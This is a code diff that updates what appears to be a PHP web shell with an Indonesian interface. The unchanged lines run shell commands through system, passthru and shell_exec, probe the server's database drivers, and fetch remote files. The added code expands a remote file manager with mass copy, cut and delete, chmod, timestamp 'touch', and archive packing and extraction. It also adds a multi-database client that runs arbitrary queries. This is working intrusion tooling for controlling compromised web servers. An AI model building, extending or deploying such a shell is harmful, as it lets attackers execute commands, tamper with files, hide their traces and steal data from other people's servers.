@@ -72,6 +72,10 @@ function serverSecInfo(){
 	if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
 	if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
 	if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
+	if(AvFunc(array('odbc_connect'))){$temp[] = "odbc";}
+	if(AvFunc(array('sqlite_open'))){$temp[] = "SQLite";}
+	if(class_exists('SQLite3')){$temp[] = "SQLite3";}
+	if(class_exists('PDO')){$temp[] = "PDO";}
 	$sInfo[] = showInf('System', @php_uname());
 	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
 	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
@@ -139,6 +143,19 @@ function transferFile($xurl, $xpath, $xname){
 	}
 	return isset($outs) ? $outs : array($xname.' failed!');
 }
+function addDirToZip($zip, $dir, $basePath){
+	if(class_exists('ZipArchive')){
+		$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+		foreach ($iterator as $file) {
+			$relativePath = $dir . '/' . $iterator->getSubPathName();
+			if ($file->isDir()) {
+				$zip->addEmptyDir($relativePath);
+			} else {
+				$zip->addFile($file->getRealPath(), $relativePath);
+			}
+		}
+	}
+}
 function fType($a,$c=null){
 	$c = !empty($c) ? $c : '2em';
 	switch($a){
@@ -159,7 +176,7 @@ function fType($a,$c=null){
 		case 'bc'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>'; break;
 		case 'sql'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M448 80v48c0 44.2-100.3 80-224 80S0 172.2 0 128V80C0 35.8 100.3 0 224 0S448 35.8 448 80zM393.2 214.7c20.8-7.4 39.9-16.9 54.8-28.6V288c0 44.2-100.3 80-224 80S0 332.2 0 288V186.1c14.9 11.8 34 21.2 54.8 28.6C99.7 230.7 159.5 240 224 240s124.3-9.3 169.2-25.3zM0 346.1c14.9 11.8 34 21.2 54.8 28.6C99.7 390.7 159.5 400 224 400s124.3-9.3 169.2-25.3c20.8-7.4 39.9-16.9 54.8-28.6V432c0 44.2-100.3 80-224 80S0 476.2 0 432V346.1z"/></svg>'; break;
 		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
-		case 'loader': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--cyan)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
+		case 'loader': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'"><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="#2be2ff" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
 	}
 	return $b;
 }
@@ -271,7 +288,7 @@ function ex($init){
 			} else if($c == 'system' || $c == 'passthru'){
 				if(AvFunc(array('system', 'passthru', 'ob_start', 'ob_get_clean'))){ob_start(); @$c($init); $out=ob_get_clean(); break;}
 			} else if($c == 'shell_exec'){
-				if(AvFunc(array($c))){$out=$c($init); break;					}
+				if(AvFunc(array($c))){$out=$c($init); break;}
 			} else if($c == 'mail' || $c == 'mb_send_mail'){
 				if(AvFunc(array('mail', 'mb_send_mail', 'ob_start', 'ob_get_clean'))){ob_start(); fakemail("{$c}",$init); $out=ob_get_clean(); break;}
 			} else {
@@ -340,6 +357,28 @@ function xrmdir($dir){
 		}
 		rmdir($dir);
 	}
+}
+function copyDir($source, $destination) {
+    if(!is_dir($source)){
+        return false;
+    }
+    if(!file_exists($destination)){
+        @mkdir($destination, 0777, true);
+    }
+    $items = @scandir($source);
+    foreach($items as $item){
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $sourceItem = $source . '/' . $item;
+        $destinationItem = $destination . '/' . $item;
+        if (@is_dir($sourceItem)) {
+            copyDir($sourceItem, $destinationItem);
+        } else {
+            @copy($sourceItem, $destinationItem);
+        }
+    }
+    return true;
 }
 function urutberkas($a){
 	$b = @scandir($a);
@@ -431,23 +470,28 @@ function filemanager($fm){
 			</div>
 		</form>
 	</div>";
-	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
+	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th colspan='2' class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
+	$fmtfoot  = "";
 	$cDir = 0; $cFile = 0;
 	if(count($lokasinya)>0){
+		$nDirsd = "";
 		foreach($lokasinya as $kl => $dir){
+			$nDirsd = $dir['entry_path'];
 			$owner = owner($dir['full_path']);
 			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
 			if($dir['type'] == 'dir'){
 				$cDir += 1;
+				$zadd = "";
+				if(class_exists('ZipArchive')){
+					$zadd .= "<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress zip</option>";
+				}
+				$zadd .= "<option value='tar' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress tar</option>";
+				$zadd .= "<option value='tgz' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>compress tgz</option>";
 				$txcol = stColor($dir['full_path']);
 				switch($txcol){
 					case 'text-danger' : $dlinks = "<span class='text-danger'>{$dir['entry']}</span>"; break;
 					case 'text-warning' : $dlinks = "<a href='#!' class='text-warning' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>"; break;
 					case 'text-success' :$dlinks = "<a href='#!' class='text-success' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>"; break;
-				}
-				$zadd = '';
-				if(class_exists('ZipArchive')){
-					$zadd .= "<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";
 				}
 				if(!in_array($dir['entry'], array('.', '..'))){
 					switch($txcol){
@@ -455,7 +499,7 @@ function filemanager($fm){
 						case 'text-warning' : $formper = "<span class='text-warning'>".statusnya($dir['full_path'])."</span>"; $formsel = "<span class='text-warning'>-</span>"; break;
 						case 'text-success' : 
 							$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
-							$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
+							$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option><option value='copy' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>copy</option><option value='cut' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>cut</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
 						break;
 						default : $formper = statusnya($dir['full_path']); $formsel = "-";
 					}
@@ -465,6 +509,12 @@ function filemanager($fm){
 				}
 				$formper .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
 				$fmtable .= "<tr>
+					<td class='text-center align-middle pr-0'>
+						<div class='custom-control custom-checkbox'>
+							<input type='checkbox' class='custom-control-input' id='diCheck {$dir['entry']}' data-xtype='dir' data-xname='{$dir['entry']}'/>
+							<label class='custom-control-label' for='diCheck {$dir['entry']}'></label>
+						</div>
+					</td>
 					<td class='text-left align-middle'>
 						<div class='media dir'>".fType('dir','1.7em')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
 					</td>
@@ -482,8 +532,8 @@ function filemanager($fm){
 					case 'text-success' :$flinks = "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>"; break;
 				}
 				$flinks .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
+				$zadd = "";
 				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
-				$zadd = '';
 				if(!empty($ext)){
 					switch(strtolower(ucwords($ext))){
 						case'css': case'less': $ftype = fType('css','1.5em'); break;
@@ -491,15 +541,20 @@ function filemanager($fm){
 						case'js': case'json': $ftype = fType('js','1.8em'); break;
 						case'php': case'phtml': case'php5': case'php7': case'phar': case'inc': case'module': case'hphp': case'ctp': case'hphp': $ftype = fType('php'); break;
 						case'html': case'htm': case'shtml': case'xhtml': case'xml': $ftype = fType('html'); break;
-						case'zip': case'rar': case'tar': case'tar.bz': case'tar.gz': $ftype = fType('zip'); break;
+						case'zip': case'rar': case'tar': case'bz': case'gz': case'tgz': $ftype = fType('zip'); break;
 						case'jpg': case'png': case'bmp': case'gif': case'webp': case'psd': case'jpeg': case'ico': case'ai': case'xcf': case'cdr': case'tif': case'tif': case'tiff': case'eps': $ftype = fType('img'); break;
 						default: $ftype = fType('other');
 					}
-					if(class_exists('ZipArchive')){
-						$zadd .= "<option value='zip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";						
-						if($ext == 'zip'){
-							$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>unzip</option>";						
+					if($ext == 'zip'){
+						if(class_exists('ZipArchive')){
+							$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract zip</option>";						
 						}
+					}
+					if($ext == 'tar'){
+						$zadd .= "<option value='untar' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract tar</option>";
+					}
+					if(in_array($ext, ['gz','tgz'])){
+						$zadd .= "<option value='untgz' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>extract tgz</option>";
 					}
 				} else {
 					$ftype = fType('other');
@@ -507,9 +562,15 @@ function filemanager($fm){
 				switch($fcolor){
 					case 'text-danger' : $fselc = "<span class='text-danger'>-</span>"; break;
 					case 'text-warning' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option></select>"; break;
-					case 'text-success' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>{$zadd}<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>"; break;
+					case 'text-success' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='copy' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>copy</option><option value='cut' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>cut</option>{$zadd}<option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option><option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>"; break;
 				}
 				$fmtable .= "<tr>
+					<td class='text-center align-middle pr-0'>
+						<div class='custom-control custom-checkbox'>
+							<input type='checkbox' class='custom-control-input' id='diCheck {$dir['entry']}' data-xtype='file' data-xname='{$dir['entry']}'/>
+							<label class='custom-control-label' for='diCheck {$dir['entry']}'></label>
+						</div>
+					</td>
 					<td class='text-left align-middle'>
 						<div class='media file'>{$ftype}<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
 					</td>
@@ -520,12 +581,263 @@ function filemanager($fm){
 				</tr>";
 			}
 		}
+		$zadx ="<option value='mass_copy'>copy</option><option value='mass_cut'>cut</option><option value='mass_del'>del</option><option value='mass_tar'>compress tar</option><option value='mass_tgz'>compress tgz</option>";
+		if(class_exists("ZipArchive")){
+			$zadx .= "<option value='mass_zip'>compress zip</option>";
+		}
+		$fmtfoot .= "<tfoot class='text-light'>
+			<tr>
+				<th class='text-center align-middle font-weight-normal small pl-1 pr-0'>
+					<div class='custom-control custom-checkbox'>
+						<input type='checkbox' class='custom-control-input' id='diCheckAll'/>
+						<label class='custom-control-label' for='diCheckAll'></label>
+					</div>
+				</th>
+				<th class='align-middle font-weight-normal small pl-0 py-2'>
+					<select class='custom-select custom-select-sm border-success' id='fdirexec' data-xpath='{$nDirsd}'><option value='' disabled selected>action</option>{$zadx}</select>
+				</th>
+				<th class='text-right align-middle font-weight-normal small' colspan='4'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th>
+			</tr>
+		</tfoot>";
 	} else {
-		$fmtable .= "<tr><td class='text-center' colspan='5'>Direktori tidak berisi file apapun</td></tr>";
+		$fmtable .= "<tr><td class='text-center' colspan='6'>Direktori tidak berisi file apapun</td></tr>";
 	}
-	$fmtable .= "</tbody><tfoot class='text-light'><tr><th class='font-weight-normal small' colspan='5'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th></tr></tfoot>";
-	$fmtable .= "</table></div></div>";
+	$fmtable .= "</tbody>{$fmtfoot}</table></div></div>";
 	return $fmtable;
+}
+class DatabaseManager {
+    private $connection;
+    private $dbType;
+    public function __construct($dbType, $host, $user = null, $password = null, $dbName = null) {
+        $this->dbType = strtolower($dbType);
+		try {
+			switch ($this->dbType) {
+				case 'mysql': $this->connection = $this->connectMySQL($host, $user, $password, $dbName); break;
+				case 'pgsql': $this->connection = $this->connectPostgres($host, $user, $password, $dbName); break;
+				case 'sqlite3': $this->connection = $this->connectSQLite3($host); break;
+				case 'sqlite': $this->connection = $this->connectSQLite($host); break;
+				case 'mssql': $this->connection = $this->connectMSSQL($host, $user, $password, $dbName); break;
+				case 'oracle': $this->connection = $this->connectOracle($host, $user, $password); break;
+				case 'odbc': $this->connection = $this->connectODBC($host, $user, $password); break;
+				case 'pdo': $this->connection = $this->connectPDO($host, $user, $password, $dbName); break;
+				default: throw new Exception("Unsupported database type: $this->dbType");
+			}
+			if (!$this->connection) {
+				throw new Exception("Failed to connect to the $this->dbType database.");
+			}
+		} catch (Exception $e) {
+			throw $e;
+		}
+    }
+    private function connectMySQL($host, $user, $password, $dbName) {
+		try {
+			if (class_exists('mysqli')) {
+				$conn = new mysqli($host, $user, $password, $dbName);
+				if ($conn->connect_error) {
+					throw new Exception("MySQL connection failed: " . $conn->connect_error);
+				}
+				return $conn;
+			} elseif (function_exists('mysql_connect')) {
+				$conn = @mysql_connect($host, $user, $password);
+				if ($conn && $dbName) {
+					mysql_select_db($dbName, $conn);
+				}
+				return $conn;
+			}
+			return false;
+		} catch (Exception $e) {
+			throw $e;
+		}
+    }
+    private function connectPostgres($host, $user, $password, $dbName) {
+        $hostStr = strpos($host, ':') !== false 
+            ? "host=" . explode(':', $host)[0] . " port=" . explode(':', $host)[1] 
+            : "host=$host";
+        $dbString = "$hostStr user=$user password=$password";
+        if ($dbName) {
+            $dbString .= " dbname=$dbName";
+        }
+        return function_exists('pg_connect') ? @pg_connect($dbString) : false;
+    }
+    private function connectSQLite3($filePath) {return class_exists('SQLite3') ? new SQLite3($filePath) : false;}
+    private function connectSQLite($filePath) {return function_exists('sqlite_open') ? @sqlite_open($filePath) : false;}
+    private function connectMSSQL($host, $user, $password, $dbName) {
+		if (function_exists('sqlsrv_connect')) {
+            $connectionInfo = ["UID" => $user, "PWD" => $password];
+            if ($dbName) {
+                $connectionInfo["Database"] = $dbName;
+            }
+            return @sqlsrv_connect($host, $connectionInfo);
+        } elseif (function_exists('mssql_connect')) {
+            $conn = @mssql_connect($host, $user, $password);
+            if ($conn && $dbName) {
+                mssql_select_db($dbName, $conn);
+            }
+            return $conn;
+        }
+        return false;
+    }
+    private function connectOracle($host, $user, $password) {return function_exists('oci_connect') ? @oci_connect($user, $password, $host) : false;}
+    private function connectODBC($dsn, $user, $password) {return function_exists('odbc_connect') ? @odbc_connect($dsn, $user, $password) : false;}
+    private function connectPDO($dsn, $user, $password, $dbName) {
+		try {
+			$dsn = $dbName ? "$dsn;dbname=$dbName" : $dsn;
+			return class_exists('PDO') ? new PDO($dsn, $user, $password) : false;
+		} catch (PDOException $e) {
+			throw $e;
+		}
+    }
+	public function getFieldInfo($result) {
+		try {
+			$fieldInfo = [
+				'field_count' => 0,
+				'field_names' => []
+			];
+			switch ($this->dbType) {
+				case 'mysql':
+					if (class_exists('mysqli')) {
+						$fieldInfo['field_count'] = $result->field_count;
+						while ($field = $result->fetch_field()) {$fieldInfo['field_names'][] = $field->name;}
+					} elseif (function_exists('mysql_fetch_fields')) {
+						$fieldInfo['field_count'] = mysql_num_fields($result);
+						for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = mysql_field_name($result, $i);}
+					}
+				break;
+				case 'pgsql': $fieldInfo['field_count'] = pg_num_fields($result); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = pg_field_name($result, $i);} break;
+				case 'sqlite3': $fieldInfo['field_count'] = $result->numColumns(); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = $result->columnName($i);} break;
+				case 'sqlite': $fieldInfo['field_count'] = sqlite_num_fields($result); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = sqlite_field_name($result, $i);} break;
+				case 'mssql': if (function_exists('sqlsrv_field_metadata')) { $metadata = sqlsrv_field_metadata($result); $fieldInfo['field_count'] = count($metadata); foreach ($metadata as $field) {$fieldInfo['field_names'][] = $field['Name'];}} break;
+				case 'oracle': $fieldInfo['field_count'] = oci_num_fields($result); for ($i = 1; $i <= $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = oci_field_name($result, $i);} break;
+                case 'odbc': $fieldInfo['field_count'] = odbc_num_fields($result); for ($i = 1; $i <= $fieldInfo['field_count']; $i++) {$fieldInfo['field_names'][] = odbc_field_name($result, $i);} break;
+                case 'pdo': $fieldInfo['field_count'] = $result->columnCount(); for ($i = 0; $i < $fieldInfo['field_count']; $i++) {$columnMeta = $result->getColumnMeta($i); $fieldInfo['field_names'][] = $columnMeta['name'];} break;
+                default: throw new Exception("getFieldInfo not supported for database type: $this->dbType");
+            }
+            return $fieldInfo;
+        } catch (Exception $e) {
+            throw $e;
+        }
+    }
+	public function affectedRows($result = null) {
+		try {
+			switch ($this->dbType) {
+				case 'mysql': if (class_exists('mysqli')) { return $this->connection->affected_rows;} elseif (function_exists('mysql_affected_rows')) {return mysql_affected_rows($this->connection);}break;
+				case 'pgsql': return pg_affected_rows($result);
+				case 'sqlite3': return $this->connection->changes();
+				case 'sqlite': return sqlite_changes($this->connection);
+				case 'mssql': if (function_exists('sqlsrv_rows_affected')) { return sqlsrv_rows_affected($result); } elseif (function_exists('mssql_rows_affected')) { return mssql_rows_affected($this->connection); } break;
+				case 'oracle': return oci_num_rows($result);
+				case 'odbc': return odbc_num_rows($result);
+				case 'pdo': return $result->rowCount();
+				default: throw new Exception("affectedRows not supported for database type: $this->dbType");
+			}
+		} catch (Exception $e) {
+			throw $e;
+		}
+	}
+    public function fetchRow($result) {
+		try {
+			switch ($this->dbType) {
+				case 'mysql': return $result->fetch_assoc(); break;
+				case 'pgsql': return pg_fetch_assoc($result); break;
+				case 'sqlite3': return $result->fetchArray(SQLITE3_ASSOC); break;
+				case 'sqlite': return sqlite_fetch_array($result, SQLITE_ASSOC); break;
+				case 'mssql': return sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC); break;
+				case 'oracle': return oci_fetch_assoc($result); break;
+				case 'odbc': return odbc_fetch_array($result); break;
+				case 'pdo': return $result->fetch(PDO::FETCH_ASSOC); break;
+				default: throw new Exception("fetchRow not supported for database type: $this->dbType");
+			}
+		} catch (Exception $e) {
+			throw $e;
+		} 
+    }
+	public function numRows($result) {
+		try {
+			switch ($this->dbType) {
+				case 'mysql': return $result->num_rows;
+				case 'pgsql': return pg_num_rows($result);
+				case 'sqlite3': return $result->numColumns();
+				case 'sqlite':  return sqlite_num_rows($result);
+				case 'mssql': return sqlsrv_num_rows($result);
+				case 'oracle': throw new Exception("numRows not directly supported for Oracle. Use a COUNT query instead."); 
+				case 'odbc': return odbc_num_rows($result);
+				case 'pdo': return $result->rowCount();
+				default: throw new Exception("numRows not supported for database type: $this->dbType");
+			}
+		} catch (Exception $e) {
+			throw $e;
+		} 
+	}	
+	public function query($query) {
+		try {
+			switch ($this->dbType) {
+				case 'mysql':
+					if (class_exists('mysqli')) {
+						$result = $this->connection->query($query);
+						if ($result === false) {throw new Exception("MySQL query failed: " . $this->connection->error);}
+						return $result;
+					} elseif (function_exists('mysql_query')) {
+						$result = mysql_query($query, $this->connection);
+						if ($result === false) {throw new Exception("MySQL query failed: " . mysql_error($this->connection));}
+						return $result;
+					}
+				case 'pgsql':
+					$result = pg_query($this->connection, $query);
+					if ($result === false) {throw new Exception("PostgreSQL query failed: " . pg_last_error($this->connection));}
+					return $result;
+				case 'sqlite3':
+					$result = $this->connection->query($query);
+					if ($result === false) {throw new Exception("SQLite3 query failed: " . $this->connection->lastErrorMsg());}
+					return $result;
+				case 'sqlite':
+					$result = sqlite_query($this->connection, $query);
+					if ($result === false) {throw new Exception("SQLite query failed: " . sqlite_error_string(sqlite_last_error($this->connection)));}
+					return $result;
+				case 'mssql':
+					if (function_exists('sqlsrv_query')) {
+						$result = sqlsrv_query($this->connection, $query);
+						if ($result === false) {throw new Exception("MSSQL query failed: " . print_r(sqlsrv_errors(), true));}
+						return $result;
+					} elseif (function_exists('mssql_query')) {
+						$result = mssql_query($query, $this->connection);
+						if ($result === false) {throw new Exception("MSSQL query failed.");}
+						return $result;
+					}
+				case 'oracle':
+					$stmt = oci_parse($this->connection, $query);
+					if (!$stmt) {throw new Exception("Oracle query parsing failed.");}
+					if (!oci_execute($stmt)) {
+						$error = oci_error($stmt);
+						throw new Exception("Oracle query execution failed: " . $error['message']);
+					}
+					return $stmt;
+				case 'odbc':
+					$result = odbc_exec($this->connection, $query);
+					if ($result === false) {throw new Exception("ODBC query failed: " . odbc_errormsg($this->connection));}
+					return $result;
+				case 'pdo':
+					$result = $this->connection->query($query);
+					if ($result === false) {throw new Exception("PDO query failed: " . implode(", ", $this->connection->errorInfo()));}
+					return $result;
+				default: throw new Exception("Query not supported for database type: $this->dbType");
+			}
+		} catch (Exception $e) {
+			throw $e;
+		}
+	}
+    public function close() {
+        switch ($this->dbType) {
+            case 'mysql': return class_exists('mysqli') ? $this->connection->close() : mysql_close($this->connection); break;
+            case 'pgsql': return pg_close($this->connection); break;
+            case 'sqlite3': return $this->connection->close(); break;
+            case 'sqlite': return sqlite_close($this->connection); break;
+            case 'mssql': return function_exists('sqlsrv_close') ? sqlsrv_close($this->connection) : mssql_close($this->connection); break;
+            case 'oracle': return oci_close($this->connection); break;
+            case 'odbc': return odbc_close($this->connection); break;
+            case 'pdo': $this->connection = null; break;
+			default: throw new Exception("close not supported for database type: $this->dbType");
+        }
+    }
 }
 if(isset($_GET['act'])){
 	if($_GET['act'] == 'info'){
@@ -705,19 +1017,105 @@ if(isset($_GET['act'])){
 		clearstatcache();
 		echo $outss;
 		die();
+	} else if($_GET['act'] == 'copy'){
+		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'], $_POST['xtarget'])){
+			$df = rtrim($_POST['xpath'],'/') .'/'. $_POST['xname'];
+			$target = rtrim($_POST['xtarget'], '/');
+			if(!@is_dir($target)){
+				echo 'Tujuan ('. $target.') bukanlah sebuah direktori!';
+				die();
+			}
